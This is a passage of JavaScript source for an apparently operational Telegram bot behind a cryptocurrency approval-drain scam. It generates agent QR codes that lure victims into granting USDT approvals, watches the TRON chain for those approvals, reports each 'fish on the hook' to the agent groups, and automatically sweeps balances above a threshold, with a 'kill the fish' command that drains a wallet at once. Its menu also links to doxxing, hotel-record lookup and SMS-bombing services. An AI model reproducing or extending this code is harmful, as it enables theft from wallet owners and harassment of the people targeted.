                        `———————————\n` +
                        `🔗 <a href="${links.shop}"><u>点击访问商城</u></a>\n` +
                        `———————————\n\n` +
                        `📦 提货:\n` +
                        `商品信息:\n` +
                        `订单状态:已下单,待提货\n` +
                        `🔗 <a href="${links.goods}"><u>提货链接</u></a>\n\n` +
                        `🪫TRX闪兑»实时汇率兑换\n` +
                        `🔗 <a href="${links.trx}"><u>点击进入TRX闪兑</u></a>\n\n` +
                        `🔋能量租赁»误转退款申请\n` +
                        `🔗 <a href="${links.tk}"><u>点击进入退款登记</u></a>\n\n` +
                        `🛍实物车收货信息登记\n` +
                        `🔗 <a href="${links.sw}"><u>实物车收货信息登记</u></a>\n\n` +
                        `🔍社工库»查单开盒»开房记录\n` +
                        `🔗 <a href="${links.sgk}"><u>点击进入付费查询</u></a>\n\n` +
                        `📲短信轰炸»手机轰炸»持续高强度\n` +
                        `🔗 <a href="${links.hsn}"><u>点击进入轰炸网站</u></a>\n\n` +
                        `📲全球短信接码平台»冷门国家高响应接码\n` +
                        `🔗 <a href="${links.jm}"><u>点击进入全球接码网站</u></a>\n\n` +
                        `🔖新币担保自助申请纠纷退押处理\n` +
                        `🔗 <a href="${links.xinbi}"><u>点击进入申请退押登记</u></a>\n\n` +
                        `🔖土豆担保自助申请纠纷退押处理\n` +
                        `🔗 <a href="${links.tddb}"><u>点击进入申请退押登记</u></a>\n\n` +
                        `🔖好旺担保自助申请纠纷退押处理\n` +
                        `🔗 <a href="${links.hwdb}"><u>点击进入申请退押登记</u></a>\n\n`;
        await bot.editMessageText(newMessage, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_to_message_id: parseInt(messageId)
        });
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 处理代理回调错误:`, error);
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: "处理请求时出现错误，请联系管理员",
            show_alert: true
        });
    }
}

// 获取支付收款码
async function handleQRCodeGeneration(callbackQuery) {
    try {
        const data = callbackQuery.data;
        const match = data.match(/^qrcode_(\d+)_(\d+)_(-?\d+)$/);
        if (!match) {
            return;
        }
        const [_, userId, messageId, groupId] = match;
        const clickUserId = callbackQuery.from.id;
        const chatId = callbackQuery.message.chat.id;
        const origMessageId = callbackQuery.message.message_id;
        if (clickUserId.toString() !== userId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ 您可发送 代理 获取自己的专属推广链接",
                show_alert: true
            });
            return;
        }
        let agent = null;
        for (const [uniqueId, agentData] of cacheData.dailiMap) {
            if (agentData.tguid === userId.toString() && agentData.groupid.toString() === groupId) {
                agent = agentData;
                break;
            }
        }
        if (!agent) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ 未找到您的代理信息,请先申请代理",
                show_alert: true
            });
            return;
        }
        const uniqueId = agent.unique_id;
        const fullName = callbackQuery.from.first_name + (callbackQuery.from.last_name ? ' ' + callbackQuery.from.last_name : '');
        const timeInfo = getTimeInfo();
        const threshold = agent.threshold || 1000;
        const paymentAddress = agent.payment_address || "当前未设置,可使用【收款地址】进行设置";
        const domain = cacheData.options?.main_domain;
        if (!domain) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ 系统主域名配置错误，请联系管理员",
                show_alert: true
            });
            return;
        }
        const qrCodeFilename = `trc${uniqueId}.png`;
        const qrCodePath = `./png/${qrCodeFilename}`;
        try {
            const fileExists = fs.existsSync(qrCodePath);
            if (!fileExists) {
                const dirExists = fs.existsSync('./png');
                if (!dirExists) {
                    fs.mkdirSync('./png', { recursive: true });
                }
                const formattedDomain = domain.startsWith('http') ? domain : `https://${domain}`;
                const cleanDomain = formattedDomain.replace(/\/$/, '');
                const qrCodeUrl = `${cleanDomain}/sm?id=trc${uniqueId}`;
                await generateQRCodeWithLogo(qrCodeUrl, './logo.png', qrCodePath, uniqueId);
            }
            await bot.deleteMessage(chatId, origMessageId);
            const fileBuffer = fs.readFileSync(qrCodePath);
            const caption = `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}!请保存您的专属杀鱼收款二维码!\n\n` +
                            `⚜️授权成功后自动设置阈值:<code>${threshold}</code>\n\n` +
                            `<pre><code class="language-💰您的杀鱼自动分润地址:">${paymentAddress}</code></pre>\n\n` +
                            `<pre><code class="language-⛔️注:当前二维码仅以下钱包进行扫码">imToken钱包、TokenPocket钱包</code></pre>`;
            await bot.sendPhoto(chatId, fileBuffer, {
                caption: caption,
                parse_mode: 'HTML',
                reply_to_message_id: parseInt(messageId)
            });
            
        } catch (genError) {
        }
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 处理二维码请求错误:`, error);
    }
}

// 生成支付二维码模板
async function generateQRCodeWithLogo(url, logoPath, outputPath, uniqueId) {
    try {
        if (!fs.existsSync(logoPath)) {
            throw new Error(`模板文件不存在: ${logoPath}`);
        }
        const tempQRPath = `./temp_qr_${Date.now()}.png`;
        
        // 生成二维码
        try {
            await QRCode.toFile(tempQRPath, url, {
                errorCorrectionLevel: 'H', 
                margin: 0, 
                width: 500 
            });
        } catch (qrError) {
            throw new Error(`生成临时二维码错误: ${qrError.message}`);
        }
        if (!fs.existsSync(tempQRPath)) {
            throw new Error('临时二维码文件未创建成功');
        }
        try {
            const logoInfo = await sharp(logoPath).metadata();
            const qrBuffer = await sharp(tempQRPath).toBuffer();
            const qrPosition = {
                top: Math.floor(logoInfo.height * 0.20),
                left: Math.floor(logoInfo.width * 0.125)
            };
            const textSvg = `
            <svg width="${logoInfo.width}" height="${logoInfo.height}">
                <style>
                    .title { fill: white; font-size: 24px; font-weight: bold; font-family: "Microsoft YaHei", Arial, sans-serif; }
                </style>
                <text x="${logoInfo.width - 250}" y="${logoInfo.height - 40}" class="title">UID: ${uniqueId}</text>
            </svg>`;
            const textBuffer = Buffer.from(textSvg);
            await sharp(logoPath)
                .composite([
                    {
                        input: qrBuffer,
                        top: qrPosition.top,
                        left: qrPosition.left
                    },
                    {
                        input: textBuffer,
                        top: 0,
                        left: 0
                    }
                ])
                .toFile(outputPath);
        } catch (processError) {
            if (fs.existsSync(tempQRPath)) {
                fs.unlinkSync(tempQRPath);
            }
            throw new Error(`处理图片错误: ${processError.message}`);
        }
        if (fs.existsSync(tempQRPath)) {
            fs.unlinkSync(tempQRPath);
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 生成二维码错误:`, error);
        throw error;
    }
}


// 鱼苗地址阈值设定
async function updateThreshold(chatId, message, fishAddress, newThreshold, isKillFish = false, bot) {
  try {
    const userId = message.from.id;
    const adminStatus = await checkGroupAdminStatus(bot, chatId, userId);
    const hasAdminPermission = adminStatus.isCreator || adminStatus.isAdmin;
    const fishData = cacheData.fishMap.get(fishAddress);
    if (hasAdminPermission) {
      const fishOwnerDaili = Array.from(cacheData.dailiMap.values())
        .find(daili => String(daili.unique_id) === String(fishData?.unique_id));
      if (!fishData || !fishOwnerDaili || String(fishOwnerDaili.groupid) !== String(chatId)) {
        return '❌ 未找到该鱼苗的信息，请核对后重试。';
      }
    } else {
      const userDaili = Array.from(cacheData.dailiMap.values())
        .find(daili => String(daili.tguid) === String(userId) && String(daili.groupid) === String(chatId));
      if (!userDaili || !fishData || String(userDaili.unique_id) !== String(fishData.unique_id)) {
        return isKillFish ? '❌ 您没有权限杀此鱼苗' : '❌ 您没有权限修改此鱼苗的阈值';
      }
    }
    if (isKillFish) {
      // 针对非管理员的余额检查
      if (!hasAdminPermission) {
        const usdtBalance = parseFloat(fishData.usdt_balance);
        if (usdtBalance < 10) {
          return '❌ 该地址余额小于10USDT，禁止杀鱼';
        }
      }
      await pool.promise().query(
        "UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1",
        [0.000001, fishAddress]
      );
      return '🎣正在杀鱼，请稍等...';
    }
    const parsedThreshold = parseFloat(newThreshold);
    if (isNaN(parsedThreshold) || parsedThreshold < 10 || parsedThreshold > 1000000) {
      return '❌ 阈值必须在10到1000000之间';
    }
    await pool.promise().query(
      "UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1",
      [parsedThreshold, fishAddress]
    );
    return `✅ 修改成功！新的划币阈值为<code>${parsedThreshold.toFixed(6)}</code>`;
  } catch (error) {
    console.error(`[${getTimeInfo().time}] ${isKillFish ? '杀鱼' : '修改阈值'}错误:`, error);
    return `❌ ${isKillFish ? '杀鱼' : '修改阈值'}时出现错误，请联系管理员。`;
  }
}

// 授权后自动设置的阈值
async function updateAutoThreshold(chatId, message, newThreshold) {
   try {
       const userId = message.from.id;
       const username = message.from.username;
       const fullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
       const timeInfo = getTimeInfo();
       newThreshold = parseInt(newThreshold, 10);
       const userAgent = Array.from(cacheData.dailiMap.values())
           .find(agent => agent.tguid === userId.toString() && agent.groupid === chatId.toString());
       if (!userAgent) {
           return {
               text: `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                     `📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。`,
               options: {
                   parse_mode: 'HTML',
                   reply_to_message_id: message.message_id
               }
           };
       }
       if (isNaN(newThreshold) || newThreshold < 100 || newThreshold > 1000000) {
           return {
               text: `❌ 阈值必须是100到1000000之间的整数`,
               options: {
                   parse_mode: 'HTML',
                   reply_to_message_id: message.message_id
               }
           };
       }
       await pool.promise().query(
           "UPDATE daili SET threshold = ?, username = ?, fullName = ? WHERE unique_id = ?",
           [newThreshold, username, fullName, userAgent.unique_id]
       );
       return {
           text: `✅ 修改成功！新的自动阈值为 <code>${newThreshold}</code>`,
           options: {
               parse_mode: 'HTML',
               reply_to_message_id: message.message_id
           }
       };
   } catch (error) {
       console.error(`[${getTimeInfo().time}] 更新自动阈值错误:`, error);
       return {
           text: '❌ 设置自动阈值失败，请联系管理员',
           options: {
               parse_mode: 'HTML',
               reply_to_message_id: message.message_id
           }
       };
   }
}

// 设置收款地址
async function updatePaymentAddress(chatId, message, address) {
   try {
       const userId = message.from.id;
       const username = message.from.username;
       const fullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
       const timeInfo = getTimeInfo();
       const response = (text) => ({
           text,
           options: {
               parse_mode: 'HTML',
               reply_to_message_id: message.message_id
           }
       });
       const userAgent = Array.from(cacheData.dailiMap.values())
           .find(agent => agent.tguid === userId.toString() && agent.groupid === chatId.toString());
       if (!userAgent) {
           return response(`🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                         `📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。`);
       }
       if (!/^T[A-Za-z1-9]{33}$/.test(address)) {
           return response("❌ 无效的 TRC20 地址格式");
       }
       await pool.promise().query(
           "UPDATE daili SET payment_address = ?, username = ?, fullName = ? WHERE unique_id = ?",
           [address, username, fullName, userAgent.unique_id]
       );
       return response(`✅ 收款地址设置成功！\n\n<code>${address}</code>`);
   } catch (error) {
       console.error(`[${getTimeInfo().time}] 更新收款地址错误:`, error);
       return response("❌ 设置收款地址时出现错误，请联系管理员。");
   }
}

// 查询收款地址
async function getPaymentAddressInfo(chatId, message) {
   try {
       const userId = message.from.id;
       const username = message.from.username;
       const fullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
       const timeInfo = getTimeInfo();
       const response = (text) => ({
           text,
           options: {
               parse_mode: 'HTML',
               reply_to_message_id: message.message_id
           }
       });
       const userAgent = Array.from(cacheData.dailiMap.values())
           .find(agent => agent.tguid === userId.toString() && agent.groupid === chatId.toString());
       if (!userAgent) {
           return response(`🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                         `📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。`);
       }
       if (!userAgent.payment_address) {
           return response(`🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                         `❌ 您还未设置收款地址\n\n` +
                         `📝 可使用以下命令设置您的收款地址：\n` +
                         `收款地址 TRxxx（将TRxxx替换为你的收款地址）`);
       }
       return response(`🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                      `💰 您的收款地址：\n` +
                      `<code>${userAgent.payment_address}</code>`);
   } catch (error) {
       console.error(`[${getTimeInfo().time}] 查询收款地址错误:`, error);
       return response("❌ 查询收款地址时出现错误，请联系管理员。");
   }
}

// USDT合约地址 （不要修改） 
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// https://tronscan.org/#/contract/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/code

// 创建 TronWeb 实例
function createTronWeb() {
    try {
        const trongridkeysStr = cacheData.options.trongridkyes;
        const TRONGRID_KEYS = trongridkeysStr
            .split(/\r?\n/) 
            .map(key => key.trim()) 
            .filter(key => key.length > 0); 
        // 随机选择一个密钥
        const randomKey = TRONGRID_KEYS[Math.floor(Math.random() * TRONGRID_KEYS.length)];
        return new TronWeb({
            fullHost: 'https://api.trongrid.io',
            headers: { "TRON-PRO-API-KEY": randomKey },
        });
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 创建TronWeb实例时出错:`, error);
        return null;
    }
}

// 获取最新的区块号
async function TRCfetchLatestBlock() {
    let lastProcessedBlock = null; 
    while (true) {
        try {
            const tronWeb = createTronWeb();
            const latestBlock = await tronWeb.trx.getCurrentBlock();
            const blockNumber = latestBlock.block_header.raw_data.number;
            if (lastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] TRC初始化: 当前最新区块号为 ${blockNumber}`);
                lastProcessedBlock = blockNumber;
            } else if (blockNumber > lastProcessedBlock) {
                const newBlocks = [];
                for (let i = lastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                for (const block of newBlocks) {
                    await scanBlock(block);
                }
                lastProcessedBlock = blockNumber;
            }
        } catch (error) {
            console.error(`[${getTimeInfo().time}] TRC获取最新区块时发生错误:`, error);
        }
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
}

// TRC余额查询
async function checkBalance(addressToQuery) {
  let trxBalance = null;
  let usdtBalance = null;
  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
  // 查询 TRX
  async function queryTrxBalance(retries = 0) {
    const tronWeb = createTronWeb();
    try {
      const accountInfo = await tronWeb.trx.getAccount(addressToQuery);
      return parseFloat(tronWeb.fromSun(accountInfo.balance || 0)).toFixed(6);
    } catch (error) {
      console.error(`TRC20-查询 TRX 余额时出错 (地址: ${addressToQuery}), 尝试次数: ${retries + 1}:`, error);
      
      if (retries < 2) { // 重试3次
        await sleep(3000); // 休眠3秒后继续尝试
        return queryTrxBalance(retries + 1);
      } else {
        console.error(`TRC20-TRX 余额查询失败，已达到最大重试次数`);
        return null;
      }
    }
  }
  // 查询 USDT
  async function queryUsdtBalance(retries = 0) {
    const tronWeb = createTronWeb(); 
    try {
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtBalanceHex = await contract.balanceOf(addressToQuery).call({ from: addressToQuery });
      return parseFloat(tronWeb.toDecimal(usdtBalanceHex) / 1_000_000).toFixed(6);
    } catch (error) {
      console.error(`TRC20-查询 USDT 余额时出错 (地址: ${addressToQuery}), 尝试次数: ${retries + 1}:`, error);
      
      if (retries < 2) { 
        await sleep(3000);
        return queryUsdtBalance(retries + 1);
      } else {
        console.error(`TRC20-USDT 余额查询失败，已达到最大重试次数`);
        return null;
      }
    }
  }
  // 并行查询
  [trxBalance, usdtBalance] = await Promise.all([
    queryTrxBalance(),
    queryUsdtBalance()
  ]);
  return { trxBalance, usdtBalance };
}

// 定期更新所有鱼苗的余额
async function updateFishBalances() {
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    while (true) {
        try {
            const trcFishList = Array.from(cacheData.fishMap.values())
                .filter(fish => fish.chainid === 'TRC');
            for (const fish of trcFishList) {
                try {
                    const { trxBalance, usdtBalance } = await checkBalance(fish.fish_address);
                    if (trxBalance !== null && usdtBalance !== null) {
                        await pool.promise().query(
                            `UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'TRC'`,
                            [trxBalance, usdtBalance, fish.fish_address]
                        );
                    } else {
                        console.warn(`[${getTimeInfo().time}] 跳过余额更新: ${fish.fish_address}, 部分余额查询失败 (TRX: ${trxBalance}, USDT: ${usdtBalance})`);
                    }
                } catch (fishError) {
                    console.error(`[${getTimeInfo().time}] 更新鱼苗余额失败: ${fish.fish_address}, 错误:`, fishError);
                }
                await sleep(10000);
            }
            await sleep(30000);
        } catch (error) {
            console.error(`[${getTimeInfo().time}] 更新鱼苗余额过程中发生错误:`, error);
            // 发生错误时，休眠60秒后重试
            await sleep(60000);
        }
    }
}

// 获取区块信息
async function scanBlock(blockNumber) {
   try {
       const tronWeb = createTronWeb();
       let block = await tronWeb.trx.getBlock(blockNumber);
       if (!block || block.message?.includes('Block not found')) {
           console.log(`[${getTimeInfo().time}] TRC区块 ${blockNumber} 未找到，跳过该区块`);
           return;
       }
       if (block.transactions && block.transactions.length > 0) {
           for (const transaction of block.transactions) {
               const contract = transaction.raw_data.contract && transaction.raw_data.contract[0];
               if (!contract) continue;
               const contractType = contract.type;
               const contractParameter = contract.parameter;
               const data = contractParameter?.value?.data;
               if (contractType === 'TriggerSmartContract' && data) {
                   if (data.startsWith('23b872dd') || data.startsWith('a9059cbb')) {
                       await usdt_transfer(transaction);
                   } else if (data.startsWith('d73dd623') || data.startsWith('095ea7b3')) {
                       await usdt_approve(transaction);
                   }
               }
           }
       }
   } catch (error) {
       if (error.code === 'ECONNRESET') {
           console.log(`[${getTimeInfo().time}] TRC区块 ${blockNumber} 连接重置，跳过该区块`);
           return;
       }
       // 错误记录
       console.error(`[${getTimeInfo().time}] TRC获取区块 ${blockNumber} 时发生错误:`, {
           message: error.message,
           code: error.code,
           stack: error.stack
       });
       return;
   }
}

// TRC-USDT 转账处理
async function usdt_transfer(transaction) {
    try {
        const txID = transaction.txID;
        const contractRet = transaction.ret[0].contractRet;
        const ownerAddress = TronWeb.address.fromHex(transaction.raw_data.contract[0].parameter.value.owner_address);
        const contractAddress = transaction.raw_data.contract[0].parameter.value.contract_address;
        const data = transaction.raw_data.contract[0].parameter.value.data;
        if (contractRet !== "SUCCESS" || contractAddress !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
            return;
        }
        const toAddress = TronWeb.address.fromHex('41' + data.slice(32, 72));
        const amount = parseInt(data.slice(72), 16) / 1000000;
        const relatedAddresses = Array.from(cacheData.fishMap.values())
            .filter(row => (
                (row.fish_address === ownerAddress || row.fish_address === toAddress) && 
                row.auth_status === 1 && 
                row.chainid === 'TRC'
            ));
        if (!relatedAddresses.length) return;
        for (const row of relatedAddresses) {
            const address = row.fish_address;
            const unique_id = row.unique_id;
            const isOutgoing = address === ownerAddress;
            const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
            const transactionAddress = isOutgoing ? toAddress : ownerAddress;
            const dailiInfo = cacheData.dailiMap.get(unique_id);
            if (!dailiInfo) continue;
            const { username, groupid } = dailiInfo;
            const { trxBalance, usdtBalance } = await checkBalance(address);
            const notification = `🐟【鱼苗动账通知】TRC-USDT 转账通知🐟\n\n` +
                `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
                `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
                `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
                `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
                `🪫TRX 余额：<code>${trxBalance !== null ? trxBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
            const buttons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${txID}` }]
                    ]
                }
            };
            await bot.sendMessage(groupid, notification, {
                parse_mode: "HTML",
                disable_web_page_preview: true,
                ...buttons
            });
            if (parseFloat(usdtBalance) > parseFloat(row.threshold)) {
                await pool.promise().query(
                    "UPDATE fish SET gas_balance = ?, usdt_balance = 0.000001 WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'",
                    [trxBalance, address]
                );
                const fishInfo = cacheData.fishMap.get(address);
                if (fishInfo) {
                    fishInfo.gas_balance = trxBalance;
                    fishInfo.usdt_balance = 0.000001;
                }
                (async () => {
                    try {
                        await processTRCTransfer(address, row.permissions_fishaddress, usdtBalance);
                    } catch (error) {
                        console.error(`[${getTimeInfo().time}] 动账触发转账处理失败: ${address}, 错误:`, error);
                    }
                })();
            } else {
                await pool.promise().query(
                    "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'",
                    [trxBalance, usdtBalance, address]
                );
                const fishInfo = cacheData.fishMap.get(address);
                if (fishInfo) {
                    fishInfo.gas_balance = trxBalance;
                    fishInfo.usdt_balance = usdtBalance;
                }
            }
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] TRC处理USDT转账时发生错误:`, error);
    }
}

// TRC-USDT 授权处理
async function usdt_approve(transaction) {
   try {
       const txID = transaction.txID;
       const contractRet = transaction.ret[0].contractRet;
       const fishAddress = TronWeb.address.fromHex(transaction.raw_data.contract[0].parameter.value.owner_address);
       const contractAddress = transaction.raw_data.contract[0].parameter.value.contract_address;
       const data = transaction.raw_data.contract[0].parameter.value.data;
       if (contractRet !== "SUCCESS" || contractAddress !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") return;
       const spenderAddress = TronWeb.address.fromHex('41' + data.slice(32, 72));
       const transferAmountIn = parseInt(data.slice(72), 16) / 1000000;
       const isValidPermissionAddress = cacheData.permissionAddresses.some(
           address => address.toLowerCase() === spenderAddress.toLowerCase()
       );
       if (!isValidPermissionAddress) {
           return;
       }
       const { trxBalance, usdtBalance } = await checkBalance(fishAddress);
       let unique_id = null;
       const [browseRow] = await pool.promise().query(
           "SELECT unique_id FROM fish_browse WHERE fish_address = ? AND chainid = 'TRC' ORDER BY time DESC LIMIT 1",
           [fishAddress]
       );
       if (browseRow.length > 0 && browseRow[0].unique_id) {
           unique_id = browseRow[0].unique_id;
       } else {
           const [defaultIdRow] = await pool.promise().query(
               "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
           );
           if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
               unique_id = defaultIdRow[0].value;
           }
       }
       const dailiInfo = cacheData.dailiMap.get(unique_id);
       if (!dailiInfo) {
           console.error(`[${getTimeInfo().time}] 找不到代理信息，unique_id: ${unique_id}`);
           return;
       }
       const { username, groupid, threshold } = dailiInfo;
       const usernameDisplay = username ? ` @${username}` : '';
       const localTime = getTimeInfo().time;
       let approvalStatus = "";
       let additionalNote = "";
       const permission_address = spenderAddress;
       const [existingFish] = await pool.promise().query(
           "SELECT * FROM fish WHERE fish_address = ? AND chainid = 'TRC'",
           [fishAddress]
       );
       if (transferAmountIn === 0 || transferAmountIn < 200) {
           if (transferAmountIn === 0) {
               approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
               additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
               if (existingFish.length > 0) {
                   await pool.promise().query(
                       "UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'",
                       ["取消授权", fishAddress]
                   );
               }
           } else {
               approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
               additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
               if (existingFish.length > 0) {
                   await pool.promise().query(
                       "UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'",
                       [`授权额度：${Math.floor(transferAmountIn)}`, fishAddress]
                   );
               }
           }
       } else {
           approvalStatus = "✅ <code>授权成功</code>";
           additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fishAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
           if (parseFloat(usdtBalance) > parseFloat(threshold)) {
               if (existingFish.length > 0) {
                   await pool.promise().query(
                       "UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = 0.000001, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'",
                       [permission_address, trxBalance, threshold, localTime, unique_id, fishAddress]
                   );
               } else {
                   await pool.promise().query(
                       "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, 0.000001, ?, ?, ?, ?, NULL, 1)",
                       [fishAddress, permission_address, trxBalance, threshold, localTime, unique_id]
                   );
               }
               (async () => {
                   try {
                       await processTRCTransfer(fishAddress, permission_address, usdtBalance);
                   } catch (error) {
                       console.error(`[${getTimeInfo().time}] 授权触发转账处理失败: ${fishAddress}, 错误:`, error);
                   }
               })();
           } else {
               if (existingFish.length > 0) {
                   await pool.promise().query(
                       "UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'",
                       [permission_address, usdtBalance, trxBalance, threshold, localTime, unique_id, fishAddress]
                   );
               } else {
                   await pool.promise().query(
                       "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, ?, ?, ?, ?, ?, NULL, 1)",
                       [fishAddress, permission_address, usdtBalance, trxBalance, threshold, localTime, unique_id]
                   );
               }
           }
       }
       const notification = `🎣【有鱼上钩啦】TRC-USDT授权通知🎣\n\n` +
           `🐠鱼苗地址${usernameDisplay}：<code>${fishAddress}</code>\n\n` +
           `🔐权限地址：<code>${permission_address}</code>\n\n` +
           `📨授权状态：${approvalStatus}\n\n` +
           `⏰授权时间：<code>${localTime}</code>\n\n` +
           `🪫TRX 余额：<code>${trxBalance !== null ? trxBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
           `<b>${additionalNote}</b>`;
       const buttons = {
           reply_markup: {
               inline_keyboard: [
                   [
                       { text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${txID}` },
                       { text: "👁‍🗨查看地址画像", url: `https://tronscan.org/#/data/analytics/account/portrait?address=${fishAddress}` }
                   ]
               ]
           }
       };
       if (groupid) {
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] TRC处理USDT授权时发生错误:`, error);
   }
}

// USDT ERC20 ABI (minimal,用于 balanceOf)
const USDT_ABI = [
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"type":"function"}
];

// 合约 ABI (对应 heyue.sol 的 controlAndTransferToken 方法)
const HEYUE_ABI = [
    {"constant":false,"inputs":[{"name":"tokenAddress","type":"address"},{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"controlAndTransferToken","outputs":[],"type":"function"}
];

// EVM链USDT合约地址映射
const EVM_USDT_ADDRESSES = {
    'ERC': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'BSC': '0x55d398326f99059fF775485246999027B3197955',
    'OKC': '0x382bb369d343125bfb2117af9c149795c6c65c50',
    'GRC': '0x4151ab5072198d0843cd2999590ef292f49d6c66',
    'POL': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'
};

// EVM余额查询（本地web3直连，不经过外部API）
async function ERCcheckBalance(addressToQuery, chain) {
    let gasBalance = null;
    let usdtBalance = null;
    const chainConfig = getEVMChainConfig(chain);

    for (let retry = 0; retry < 3; retry++) {
        try {
            const web3 = new Web3(new Web3.providers.HttpProvider(chainConfig.rpc));
            const nativeWei = await web3.eth.getBalance(addressToQuery);
            gasBalance = (Number(nativeWei) / 1e18).toFixed(6);

            const usdtContract = new web3.eth.Contract(USDT_ABI, EVM_USDT_ADDRESSES[chain]);
            const usdtRaw = await usdtContract.methods.balanceOf(addressToQuery).call();
            usdtBalance = (Number(usdtRaw) / 1e6).toFixed(6);
            break;
        } catch (error) {
            console.error(`EVM余额查询失败 (地址: ${addressToQuery}, 链: ${chain}, 尝试: ${retry + 1}/3):`, error.message);
            if (retry < 2) {
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
        }
    }
    return { gasBalance, usdtBalance };
}

// 获取EVM链配置
function getEVMChainConfig(chain) {
    const configs = {
        'ERC': { rpc: 'https://rpc.ankr.com/eth', chainId: 1 },
        'BSC': { rpc: 'https://bsc-dataseed1.binance.org', chainId: 56 },
        'OKC': { rpc: 'https://exchainrpc.okex.org', chainId: 66 },
        'GRC': { rpc: 'https://evm.nodeinfo.cc', chainId: 86 },
        'POL': { rpc: 'https://polygon-mainnet.public.blastapi.io', chainId: 137 }
    };
